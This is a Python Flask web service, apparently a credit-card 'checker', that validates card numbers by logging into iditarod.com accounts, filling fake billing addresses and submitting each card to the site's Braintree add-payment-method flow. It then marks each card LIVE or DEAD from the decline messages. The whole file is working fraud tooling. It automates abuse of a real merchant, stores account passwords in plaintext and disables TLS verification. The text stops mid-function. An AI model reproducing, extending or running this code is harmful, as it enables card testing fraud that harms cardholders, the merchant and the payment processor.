from flask import Flask, request, jsonify, make_response
from flask_cors import CORS
import requests
import json
import logging
import time
import uuid
import re
import base64
from collections import OrderedDict
import urllib3
import random
import string
import hashlib
import os
from threading import Lock

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

USER_DB_FILE = 'user_cookies.json'
COOKIE_MAX_AGE = 86400
db_lock = Lock()

app = Flask(__name__)
app.config['JSON_SORT_KEYS'] = False
CORS(app)

def json_response(data, status_code=200):
    """Create JSON response with preserved key order"""
    json_str = json.dumps(data, ensure_ascii=False, indent=2, sort_keys=False)
    response = make_response(json_str, status_code)
    response.headers['Content-Type'] = 'application/json; charset=utf-8'
    return response

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%H:%M:%S'
)


def load_user_db():
    """Load user database from file"""
    if os.path.exists(USER_DB_FILE):
        try:
            with open(USER_DB_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}


def save_user_db(db):
    """Save user database to file"""
    with db_lock:
        with open(USER_DB_FILE, 'w') as f:
            json.dump(db, f, indent=2)


def get_user_key(email):
    """Generate unique key for user"""
    return hashlib.md5(email.lower().encode()).hexdigest()


def get_user_cookie(email, password):
    """Get or create cookie for user"""
    user_db = load_user_db()
    user_key = get_user_key(email)
    
    current_time = time.time()
    
    if user_key in user_db:
        user_data = user_db[user_key]
        cookie_age = current_time - user_data.get('timestamp', 0)
        
        if cookie_age < COOKIE_MAX_AGE and user_data.get('password') == password:
            logging.info(f"🍪 Using cached cookie for {email} (age: {cookie_age/3600:.1f}h)")
            return user_data.get('cookies'), user_data.get('session_data')
    
    logging.info(f"🔄 Creating new cookie for {email}...")
    session = auto_login_iditarod(email, password)
    
    if not session:
        return None, None
    
    address_data = generate_random_address()
    fill_billing_address(session, address_data, email)
    
    cookie_str = get_cookie_string_from_session(session)
    session_cookies = {}
    for cookie in session.cookies:
        session_cookies[cookie.name] = cookie.value
    
    user_db[user_key] = {
        'email': email,
        'password': password,
        'cookies': cookie_str,
        'session_data': session_cookies,
        'timestamp': current_time
    }
    
    save_user_db(user_db)
    logging.info(f"✅ New cookie saved for {email}")
    
    return cookie_str, session_cookies


def get_cookie_string_from_session(session):
    """Convert session cookies to string format"""
    cookie_pairs = []
    for cookie in session.cookies:
        cookie_pairs.append(f"{cookie.name}={cookie.value}")
    return ';'.join(cookie_pairs)


def check_card_with_user_auth(cc, email, password):
    """Check card using user's email and password with cookie management"""
    start_time = time.time()
    
    try:
        card_parts = cc.split('|')
        if len(card_parts) != 4:
            return {
                'CC': cc,
                'Status': 'DEAD',
                'Response': 'Invalid format. Use: CARD|MM|YY|CVV',
                'Time': round(time.time() - start_time, 2),
                'Gateway': 'Braintree'
            }
        
        ccn, mm, yy, cvc = card_parts
        if len(yy) == 2:
            yy = '20' + yy
        
        cookies_str, session_data = get_user_cookie(email, password)
        
        if not cookies_str:
            return {
                'CC': cc,
                'Status': 'DEAD',
                'Response': 'Login failed - Check email/password',
                'Time': round(time.time() - start_time, 2),
                'Gateway': 'Braintree'
            }
        
        cookies_dict = {}
        for cookie in cookies_str.split(';'):
            cookie = cookie.strip()
            if '=' in cookie:
                key, value = cookie.split('=', 1)
                cookies_dict[key.strip()] = value.strip()
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        }
        
        logging.info("📄 Step 1: Getting page and extracting nonces...")
        page_response = requests.get(
            'https://iditarod.com/my-account/add-payment-method/',
            headers=headers,
            cookies=cookies_dict,
            timeout=15,
            verify=False
        )
        
        page_content = page_response.text
        
        nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"', page_content)
        if not nonce_match:
            if 'wp-login.php' in page_content or 'login' in page_response.url.lower():
                user_db = load_user_db()
                user_key = get_user_key(email)
                if user_key in user_db:
                    del user_db[user_key]
                    save_user_db(user_db)
                return {
                    'CC': cc,
                    'Status': 'DEAD',
                    'Response': 'Cookie expired - Will refresh on next request',
                    'Time': round(time.time() - start_time, 2),
                    'Gateway': 'Braintree'
                }
            return {
                'CC': cc,
                'Status': 'DEAD',
                'Response': 'Could not find woocommerce nonce',
                'Time': round(time.time() - start_time, 2),
                'Gateway': 'Braintree'
            }
        woocommerce_nonce = nonce_match.group(1)
        
        client_nonce_match = re.search(r'client_token_nonce["\']?\s*:\s*["\']([^"\']+)', page_content)
        if not client_nonce_match:
            return {
                'CC': cc,
                'Status': 'DEAD',
                'Response': 'Could not find client_token_nonce',
                'Time': round(time.time() - start_time, 2),
                'Gateway': 'Braintree'
            }
        client_nonce = client_nonce_match.group(1)
        
        logging.info("🔑 Step 2: Getting client token...")
        token_response = requests.post(
            'https://iditarod.com/wp-admin/admin-ajax.php',
            headers=headers,
            cookies=cookies_dict,
            data={
                'action': 'wc_braintree_credit_card_get_client_token',
                'nonce': client_nonce,
            },
            timeout=15,
            verify=False
        )
        
        token_data = token_response.json()
        if not token_data.get('success'):
            return {
                'CC': cc,
                'Status': 'DEAD',
                'Response': 'Failed to get client token',
                'Time': round(time.time() - start_time, 2),
                'Gateway': 'Braintree'
            }
        
        client_token_encoded = token_data.get('data')
        
        logging.info("🔓 Step 3: Decoding client token...")
        client_token_decoded = json.loads(base64.b64decode(client_token_encoded))
        authorization_fingerprint = client_token_decoded.get('authorizationFingerprint')
        
        logging.info("💳 Step 4: Tokenizing card...")
        tokenize_response = requests.post(
            'https://payments.braintree-api.com/graphql',
            headers={
                'Content-Type': 'application/json',
                'Braintree-Version': '2018-05-10',
                'Authorization': f'Bearer {authorization_fingerprint}'
            },
            json={
                "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": str(uuid.uuid4())},
                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }",
                "variables": {"input": {"creditCard": {"number": ccn, "expirationMonth": mm, "expirationYear": yy, "cvv": cvc}, "options": {"validate": False}}}
            },
            timeout=15,
            verify=False
        )
        
        tokenize_data = tokenize_response.json()
        if 'errors' in tokenize_data:
            return {
                'CC': cc,
                'Status': 'DEAD',
                'Response': f'{tokenize_data["errors"][0].get("message")}',
                'Time': round(time.time() - start_time, 2),
                'Gateway': 'Braintree'
            }
        
        payment_token = tokenize_data['data']['tokenizeCreditCard']['token']
        
        logging.info("🚀 Step 5: Submitting to WooCommerce...")
        card_type = "visa" if ccn.startswith("4") else "mastercard" if ccn.startswith("5") else "discover"
        
        payment_response = requests.post(
            'https://iditarod.com/my-account/add-payment-method/',
            headers={
                **headers,
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://iditarod.com',
                'referer': 'https://iditarod.com/my-account/add-payment-method/',
            },
            cookies=cookies_dict,
            data={
                'payment_method': 'braintree_credit_card',
                'wc-braintree-credit-card-card-type': card_type,
                'wc-braintree-credit-card-3d-secure-enabled': '',
                'wc-braintree-credit-card-3d-secure-verified': '',
                'wc-braintree-credit-card-3d-secure-order-total': '0.00',
                'wc_braintree_credit_card_payment_nonce': payment_token,
                'wc_braintree_device_data': '',
                'wc-braintree-credit-card-tokenize-payment-method': 'true',
                'woocommerce-add-payment-method-nonce': woocommerce_nonce,
                '_wp_http_referer': '/my-account/add-payment-method/',
                'woocommerce_add_payment_method': '1',
            },
            timeout=15,
            verify=False,
            allow_redirects=True
        )
        
        response_text = payment_response.text
        
        error_match = re.search(r'<ul[^>]*class=["\'][^"\']*woocommerce-error[^"\']*["\'][^>]*>(.*?)</ul>', response_text, re.DOTALL)
        if error_match:
            li_matches = re.findall(r'<li[^>]*>(.*?)</li>', error_match.group(1), re.DOTALL)
            if li_matches:
                error_msg = re.sub(r'<[^>]+>', '', li_matches[0]).strip()
                error_msg = ' '.join(error_msg.split())
                
                if any(k in error_msg.lower() for k in ['insufficient funds', 'cvv', 'security code', 'incorrect_cvc']):
                    return {'CC': cc, 'Status': 'LIVE', 'Response': error_msg, 'Time': round(time.time() - start_time, 2), 'Gateway': 'Braintree'}
                return {'CC': cc, 'Status': 'DEAD', 'Response': error_msg, 'Time': round(time.time() - start_time, 2), 'Gateway': 'Braintree'}
        
        success_match = re.search(r'Nice!\s+New payment method added', response_text, re.IGNORECASE)
        if success_match or 'payment method added' in response_text.lower() or 'woocommerce-message' in response_text.lower():
            return {'CC': cc, 'Status': 'LIVE', 'Response': '1000: Approved ✓', 'Time': round(time.time() - start_time, 2), 'Gateway': 'Braintree'}
        
        return {'CC': cc, 'Status': 'DEAD', 'Response': 'Card declined', 'Time': round(time.time() - start_time, 2), 'Gateway': 'Braintree'}
        
    except Exception as e:
        return {'CC': cc, 'Status': 'DEAD', 'Response': f'Error: {str(e)[:50]}', 'Time': round(time.time() - start_time, 2), 'Gateway': 'Braintree'}


def generate_random_address():
    """Generate random valid US address with matching city/state pairs"""
    first_names = ['John', 'James', 'Michael', 'Robert', 'David', 'William', 'Richard', 'Joseph', 'Thomas', 'Charles']
    last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez']
    streets = ['Main St', 'Oak Ave', 'Maple Dr', 'Cedar Ln', 'Pine St', 'Elm Ave', 'Park Rd', 'Lake Dr', 'Hill St', 'River Rd']
    
    city_state_zip = [
        ('New York', 'NY', '10001'),
        ('Los Angeles', 'CA', '90001'),
        ('Chicago', 'IL', '60601'),
        ('Houston', 'TX', '77001'),
        ('Phoenix', 'AZ', '85001'),
        ('Philadelphia', 'PA', '19101'),
        ('San Antonio', 'TX', '78201'),
        ('San Diego', 'CA', '92101'),
        ('Dallas', 'TX', '75201'),
        ('San Jose', 'CA', '95101')
    ]
    
    city, state, base_zip = random.choice(city_state_zip)
    
    address_data = {
        'first_name': random.choice(first_names),
        'last_name': random.choice(last_names),
        'address_1': f"{random.randint(100, 9999)} {random.choice(streets)}",
        'city': city,
        'state': state,
        'postcode': base_zip,
        'phone': f"{random.randint(200, 999)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
    }
    return address_data


def auto_login_iditarod(email, password):
    """Auto login to iditarod.com and return session"""
    try:
        session = requests.Session()
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        }
        
        logging.info(f"🔑 Auto-login: Getting login page for {email[:10]}...")
        login_page = session.get(
            'https://iditarod.com/my-account/',
            headers=headers,
            timeout=15,
            verify=False
        )
        
        nonce_match = re.search(r'name="woocommerce-login-nonce"\s+value="([^"]+)"', login_page.text)
        if not nonce_match:
            logging.error("❌ Could not find login nonce")
            return None
        
        login_nonce = nonce_match.group(1)
        logging.info(f"✅ Login nonce: {login_nonce}")
        
        logging.info(f"🔐 Logging in as {email}...")
        login_data = {
            'username': email,
            'password': password,
            'woocommerce-login-nonce': login_nonce,
            '_wp_http_referer': '/my-account/',
            'login': 'Log in'
        }
        
        login_response = session.post(
            'https://iditarod.com/my-account/',
            headers={**headers, 'content-type': 'application/x-www-form-urlencoded'},
            data=login_data,
            timeout=15,
            verify=False,
            allow_redirects=True
        )
        
        logging.info(f"📊 Login response URL: {login_response.url}")
        
        if 'my-account' in login_response.url and 'wp-login' not in login_response.url:
            logging.info(f"✅ Login successful for {email}")
            return session
        else:
            if 'error' in login_response.text.lower():
                error_preview = login_response.text[:500]
                logging.error(f"❌ Login failed for {email} - Response: {error_preview}")
            else:
                logging.error(f"❌ Login failed for {email} - Redirected to: {login_response.url}")
            return None
            
    except Exception as e:
        logging.error(f"❌ Login error: {str(e)}")
        return None


def fill_billing_address(session, address_data, email):
    """Fill billing address on iditarod.com"""
    try:
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        }
        
        logging.info("📝 Getting edit address page...")
        address_page = session.get(
            'https://iditarod.com/my-account/edit-address/billing/',
            headers=headers,
            timeout=15,
            verify=False
        )
        
        nonce_match = re.search(r'name="woocommerce-edit-address-nonce"\s+value="([^"]+)"', address_page.text)
        if not nonce_match:
            logging.error("❌ Could not find address nonce")
            return False
        
        address_nonce = nonce_match.group(1)
        logging.info(f"✅ Address nonce: {address_nonce}")
        
        logging.info(f"📮 Filling address: {address_data['city']}, {address_data['state']}...")
        form_data = {
            'billing_first_name': address_data['first_name'],
            'billing_last_name': address_data['last_name'],
            'billing_company': '',
            'billing_country': 'US',
            'billing_address_1': address_data['address_1'],
            'billing_address_2': '',
            'billing_city': address_data['city'],
            'billing_state': address_data['state'],
            'billing_postcode': address_data['postcode'],
            'billing_phone': address_data['phone'],
            'billing_email': email,
            'woocommerce-edit-address-nonce': address_nonce,
            '_wp_http_referer': '/my-account/edit-address/billing/',
            'action': 'edit_address',
            'save_address': 'Save address'
        }
        
        address_response = session.post(
            'https://iditarod.com/my-account/edit-address/billing/',
            headers={**headers, 'content-type': 'application/x-www-form-urlencoded'},
            data=form_data,
            timeout=15,
            verify=False,
            allow_redirects=True
        )
        
        if 'Address changed successfully' in address_response.text:
            logging.info("✅ Address filled successfully!")
            return True
        else:
            logging.error("❌ Address fill failed - success message not found")
            logging.error(f"Response preview: {address_response.text[:200]}")
            return False
            
    except Exception as e:
        logging.error(f"❌ Address fill error: {str(e)}")
        return False


def check_braintree_card_auto_login(cc):
    """Cookie-based card check with rotation - No login needed!"""
    start_time = time.time()
    
    try:
        card_parts = cc.split('|')
        if len(card_parts) != 4:
            return {
                'CC': cc,
                'Status': 'DEAD',
                'Response': 'Invalid format. Use: CARD|MM|YY|CVV',
                'Time': round(time.time() - start_time, 2)
            }
        
        ccn, mm, yy, cvc = card_parts
        if len(yy) == 2:
            yy = '20' + yy
        
        cookie_entry = get_fresh_cookie()
        if not cookie_entry:
            return {
                'CC': cc,
                'Status': 'DEAD',
                'Response': 'No valid cookies available',
                'Time': round(time.time() - start_time, 2)
            }
        
        logging.info(f"🍪 Using cookies from {cookie_entry['email']}")
        session = cookie_entry['session']
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        }
        
        logging.info("📄 Step 1: Getting add payment method page...")
        page_response = session.get(
            'https://iditarod.com/my-account/add-payment-method/',
            headers=headers,
            timeout=15,
            verify=False
        )
        
        page_content = page_response.text
        
        nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"', page_content)
        if not nonce_match:
            return {
                'CC': cc,
                'Status': 'DEAD',
                'Response': 'Could not find woocommerce nonce',
                'Time': round(time.time() - start_time, 2)
            }
        woocommerce_nonce = nonce_match.group(1)
        
        client_nonce_match = re.search(r'client_token_nonce["\']?\s*:\s*["\']([^"\']+)', page_content)
        if not client_nonce_match:
            return {
                'CC': cc,
                'Status': 'DEAD',
                'Response': 'Could not find client_token_nonce',
                'Time': round(time.time() - start_time, 2)
            }
        client_nonce = client_nonce_match.group(1)
        
        logging.info("🔑 Step 2: Getting client token...")
        token_response = session.post(
            'https://iditarod.com/wp-admin/admin-ajax.php',
            headers=headers,
            data={
                'action': 'wc_braintree_credit_card_get_client_token',
                'nonce': client_nonce,
            },
            timeout=15,
            verify=False
        )
        
        token_data = token_response.json()
        if not token_data.get('success'):
            return {
                'CC': cc,
                'Status': 'DEAD',
                'Response': 'Failed to get client token',
                'Time': round(time.time() - start_time, 2)
            }
        
        client_token_encoded = token_data.get('data')
        
        logging.info("🔓 Step 3: Decoding client token...")
        client_token_decoded = json.loads(base64.b64decode(client_token_encoded))
        authorization_fingerprint = client_token_decoded.get('authorizationFingerprint')
        
        logging.info("💳 Step 4: Tokenizing card...")
        tokenize_response = requests.post(
            'https://payments.braintree-api.com/graphql',
            headers={
                'Content-Type': 'application/json',
                'Braintree-Version': '2018-05-10',
                'Authorization': f'Bearer {authorization_fingerprint}'
            },
            json={
                "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": str(uuid.uuid4())},
                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }",
                "variables": {"input": {"creditCard": {"number": ccn, "expirationMonth": mm, "expirationYear": yy, "cvv": cvc}, "options": {"validate": False}}}
            },
            timeout=15,
            verify=False
        )
        
        tokenize_data = tokenize_response.json()
        if 'errors' in tokenize_data:
            return {
                'CC': cc,
                'Status': 'DEAD',
                'Response': f'Tokenize error: {tokenize_data["errors"][0].get("message")}',
                'Time': round(time.time() - start_time, 2)
            }
        
        payment_token = tokenize_data['data']['tokenizeCreditCard']['token']
        
        logging.info("🚀 Step 5: Submitting to WooCommerce...")
        card_type = "visa" if ccn.startswith("4") else "mastercard" if ccn.startswith("5") else "discover"
        
        payment_response = session.post(
            'https://iditarod.com/my-account/add-payment-method/',
            headers={
                **headers,
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://iditarod.com',
                'referer': 'https://iditarod.com/my-account/add-payment-method/',
            },
            data={
                'payment_method': 'braintree_credit_card',
                'wc-braintree-credit-card-card-type': card_type,
                'wc-braintree-credit-card-3d-secure-enabled': '',
                'wc-braintree-credit-card-3d-secure-verified': '',
                'wc-braintree-credit-card-3d-secure-order-total': '0.00',
                'wc_braintree_credit_card_payment_nonce': payment_token,
                'wc_braintree_device_data': '',
                'wc-braintree-credit-card-tokenize-payment-method': 'true',
                'woocommerce-add-payment-method-nonce': woocommerce_nonce,
                '_wp_http_referer': '/my-account/add-payment-method/',
                'woocommerce_add_payment_method': '1',
            },
            timeout=15,
            verify=False,
            allow_redirects=True
        )
        
        response_text = payment_response.text
        
        success_message_match = re.search(r'<div[^>]*class=["\'][^"\']*woocommerce-message[^"\']*["\'][^>]*>(.*?)</div>', response_text, re.DOTALL)
        if success_message_match:
            success_text = re.sub(r'<[^>]+>', '', success_message_match.group(1)).strip()
            logging.info(f"✅ SUCCESS: Payment method added - {success_text[:50]}")
            return {'CC': cc, 'Status': 'LIVE', 'Response': 'Payment method added successfully', 'Time': round(time.time() - start_time, 2)}
        
        error_match = re.search(r'<ul[^>]*class=["\'][^"\']*woocommerce-error[^"\']*["\'][^>]*>(.*?)</ul>', response_text, re.DOTALL)
        if error_match:
            li_matches = re.findall(r'<li[^>]*>(.*?)</li>', error_match.group(1), re.DOTALL)
            if li_matches:
                error_msg = re.sub(r'<[^>]+>', '', li_matches[0]).strip()
                error_msg = ' '.join(error_msg.split())
                
                logging.info(f"📋 Error message: {error_msg}")
                
                if 'duplicate' in error_msg.lower() or 'already' in error_msg.lower():
                    logging.info(f"✅ LIVE (duplicate)")
                    return {'CC': cc, 'Status': 'LIVE', 'Response': 'Card already added', 'Time': round(time.time() - start_time, 2)}
                
                live_indicators = ['insufficient funds', 'avs']
                
                if any(indicator in error_msg.lower() for indicator in live_indicators):
                    logging.info(f"✅ LIVE - {error_msg[:30]}")
                    return {'CC': cc, 'Status': 'LIVE', 'Response': error_msg, 'Time': round(time.time() - start_time, 2)}
                
                logging.info(f"❌ DEAD - {error_msg[:30]}")
                return {'CC': cc, 'Status': 'DEAD', 'Response': error_msg, 'Time': round(time.time() - start_time, 2)}
        
        if 'payment-methods' in payment_response.url or 'my-account' in payment_response.url:
            logging.info(f"✅ SUCCESS: Card accepted (redirected to account page)")
            return {'CC': cc, 'Status': 'LIVE', 'Response': 'Payment method added successfully', 'Time': round(time.time() - start_time, 2)}
        
        logging.warning(f"⚠️ Unknown response - marking as DEAD")
        return {'CC': cc, 'Status': 'DEAD', 'Response': 'Unknown response from server', 'Time': round(time.time() - start_time, 2)}
        
    except Exception as e:
        return {'CC': cc, 'Status': 'DEAD', 'Response': f'Error: {str(e)[:50]}', 'Time': round(time.time() - start_time, 2)}


def check_braintree_card(cc, cookies_str):
    """Complete Braintree card checking flow - Exact K4LNX implementation"""
    start_time = time.time()
    
    try:
        # Parse card details
        card_parts = cc.split('|')
        if len(card_parts) != 4:
            return {
                'CC': cc,
                'Status': 'DEAD',
                'Response': 'Invalid format. Use: CARD|MM|YY|CVV',
                'Time': round(time.time() - start_time, 2)
            }
        
        ccn, mm, yy, cvc = card_parts
        if len(yy) == 2:
            yy = '20' + yy
        
        # Parse cookies string to dict
        cookies_dict = {}
        for cookie in cookies_str.split(';'):
            cookie = cookie.strip()
            if '=' in cookie:
                key, value = cookie.split('=', 1)
                cookies_dict[key.strip()] = value.strip()
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        }
        
        # STEP 1: Get page and extract nonces
        logging.info("📄 Step 1: Getting page and extracting nonces...")
        page_response = requests.get(
            'https://iditarod.com/my-account/add-payment-method/',
            headers=headers,
            cookies=cookies_dict,
            timeout=15,
            verify=False
        )
        
        page_content = page_response.text
        
        # Extract woocommerce-add-payment-method-nonce
        nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"', page_content)
        if not nonce_match:
            # Check if cookies are invalid
            if 'wp-login.php' in page_content or 'login' in page_response.url.lower():
                return {
                    'CC': cc,
                    'Status': 'DEAD',
                    'Response': 'Invalid cookies - Please update cookies',
                    'Time': round(time.time() - start_time, 2)
                }
            return {
                'CC': cc,
                'Status': 'DEAD',
                'Response': 'Could not find woocommerce nonce - Check cookies',
                'Time': round(time.time() - start_time, 2)
            }
        woocommerce_nonce = nonce_match.group(1)
        logging.info(f"✅ WooCommerce nonce: {woocommerce_nonce}")
        
        # Extract client_token_nonce
        client_nonce_match = re.search(r'client_token_nonce["\']?\s*:\s*["\']([^"\']+)', page_content)
        if not client_nonce_match:
            return {
                'CC': cc,
                'Status': 'DEAD',
                'Response': 'Could not find client_token_nonce',
                'Time': round(time.time() - start_time, 2)
            }
        client_nonce = client_nonce_match.group(1)
        logging.info(f"✅ Client nonce: {client_nonce}")
        
        # STEP 2: Get client token from admin-ajax.php
        logging.info("🔑 Step 2: Getting client token from admin-ajax...")
        token_payload = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': client_nonce,
        }
        
        token_response = requests.post(
            'https://iditarod.com/wp-admin/admin-ajax.php',
            headers=headers,
            cookies=cookies_dict,
            data=token_payload,
            timeout=15,
            verify=False
        )
        
        token_data = token_response.json()
        
        if not token_data.get('success'):
            return {
                'CC': cc,
                'Status': 'DEAD',
                'Response': f'Failed to get client token',
                'Time': round(time.time() - start_time, 2)
            }
        
        client_token_encoded = token_data.get('data')
        if not client_token_encoded:
            return {
                'CC': cc,
                'Status': 'DEAD',
                'Response': 'No client token in response',
                'Time': round(time.time() - start_time, 2)
            }
        
        # STEP 3: Decode client token and extract authorization fingerprint
        logging.info("🔓 Step 3: Decoding client token...")
        try:
            client_token_decoded = json.loads(base64.b64decode(client_token_encoded))
            authorization_fingerprint = client_token_decoded.get('authorizationFingerprint')
            merchant_id = client_token_decoded.get('merchantId')
            logging.info(f"✅ Authorization fingerprint extracted")
            logging.info(f"✅ Merchant ID: {merchant_id}")
        except Exception as e:
            return {
                'CC': cc,
                'Status': 'DEAD',
                'Response': f'Error decoding client token: {str(e)}',
                'Time': round(time.time() - start_time, 2)
            }
        
        # STEP 4: Tokenize credit card using Braintree GraphQL
        logging.info("💳 Step 4: Tokenizing card via Braintree GraphQL...")
        session_id = str(uuid.uuid4())
        
        braintree_headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
            'Braintree-Version': '2018-05-10',
            'Authorization': f'Bearer {authorization_fingerprint}'
        }
        
        tokenize_payload = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": session_id,
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": ccn,
                        "expirationMonth": mm,
                        "expirationYear": yy,
                        "cvv": cvc,
                    },
                    "options": {
                        "validate": False,
                    },
                },
            },
        }
        
        tokenize_response = requests.post(
            'https://payments.braintree-api.com/graphql',
            headers=braintree_headers,
            json=tokenize_payload,
            timeout=15,
            verify=False
        )
        
        tokenize_data = tokenize_response.json()
        
        if 'errors' in tokenize_data:
            error_msg = tokenize_data['errors'][0].get('message', 'Unknown error')
            return {
                'CC': cc,
                'Status': 'DEAD',
                'Response': f'Tokenize error: {error_msg}',
                'Time': round(time.time() - start_time, 2)
            }
        
        payment_token = tokenize_data['data']['tokenizeCreditCard']['token']
        logging.info(f"✅ Payment token generated: {payment_token[:20]}...")
        
        # STEP 5: Submit payment method to WooCommerce
        logging.info("🚀 Step 5: Submitting to WooCommerce...")
        
        # Determine card type
        card_type = "visa" if ccn.startswith("4") else "mastercard" if ccn.startswith("5") else "discover"
        
        form_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://iditarod.com',
            'referer': 'https://iditarod.com/my-account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        }
        
        form_data = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': card_type,
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '',
            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
            'wc_braintree_credit_card_payment_nonce': payment_token,
            'wc_braintree_device_data': '',
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': woocommerce_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }
        
        payment_response = requests.post(
            'https://iditarod.com/my-account/add-payment-method/',
            headers=form_headers,
            cookies=cookies_dict,
            data=form_data,
            timeout=15,
            verify=False,
            allow_redirects=True
        )
        
        response_text = payment_response.text
        
        # Debug logging
        logging.info(f"📊 Response URL: {payment_response.url}")
        logging.info(f"📊 Response Status: {payment_response.status_code}")
        logging.info(f"📊 Response Length: {len(response_text)} chars")
        logging.info(f"📊 Response Preview: {response_text[:500]}...")
        
        # Extract WooCommerce error message first (most reliable)
        error_pattern = r'<ul[^>]*class=["\'][^"\']*woocommerce-error[^"\']*["\'][^>]*>(.*?)</ul>'
        error_match = re.search(error_pattern, response_text, re.DOTALL | re.IGNORECASE)
        
        if error_match:
            error_html = error_match.group(1)
            # Extract text from <li> tags
            li_pattern = r'<li[^>]*>(.*?)</li>'
            li_matches = re.findall(li_pattern, error_html, re.DOTALL | re.IGNORECASE)
            if li_matches:
                # Get the first error message and clean it
                error_msg = li_matches[0]
                # Remove all HTML tags
                error_msg = re.sub(r'<[^>]+>', '', error_msg)
                # Clean up whitespace
                error_msg = ' '.join(error_msg.split()).strip()
                
                # Determine status based on error message
                error_lower = error_msg.lower()
                
                # Check for LIVE responses (only these indicate valid cards)
                live_indicators = [
                    'insufficient funds',
                    'insufficient balance',
                    'cvv',
                    'security code',
                    'card verification',
                    'incorrect_cvc',
                    'invalid cvv'
                ]
                
                if any(keyword in error_lower for keyword in live_indicators):
                    logging.info(f"✅ LIVE CARD: {error_msg}")
                    return {
                        'CC': cc,
                        'Status': 'LIVE',
                        'Response': error_msg,
                        'Time': round(time.time() - start_time, 2)
                    }
                
                # All other errors are DEAD (including risk_threshold, rate limit, etc)
                logging.error(f"❌ DEAD CARD: {error_msg}")
                return {
                    'CC': cc,
                    'Status': 'DEAD',
                    'Response': error_msg,
                    'Time': round(time.time() - start_time, 2)
                }
        
        # Check for success message with card type extraction
        success_pattern = r'Nice!\s+New payment method added:\s+(\w+)'
        success_match = re.search(success_pattern, response_text, re.IGNORECASE)
        
        if success_match:
            card_name = success_match.group(1)
            success_msg = f"Nice! New payment method added: {card_name}"
            logging.info(f"✅ SUCCESS: {success_msg}")
            return {
                'CC': cc,
                'Status': 'LIVE',
                'Response': success_msg,
                'Time': round(time.time() - start_time, 2)
            }
        
        # Alternative success indicators
        success_indicators = [
            'Payment method successfully added',
            'woocommerce-message',
            'payment method was successfully added'
        ]
        
        if any(indicator.lower() in response_text.lower() for indicator in success_indicators):
            logging.info("✅ SUCCESS: Payment method added!")
            return {
                'CC': cc,
                'Status': 'LIVE',
                'Response': '1000: Approved ✓',
                'Time': round(time.time() - start_time, 2)
            }
        
        # Check if redirected to payment methods page (another success indicator)
        if 'my-account/payment-methods/' in payment_response.url:
            logging.info("✅ SUCCESS: Redirected to payment methods page!")
            return {
                'CC': cc,
                'Status': 'LIVE',
                'Response': '1000: Approved - Payment Method Added ✓',
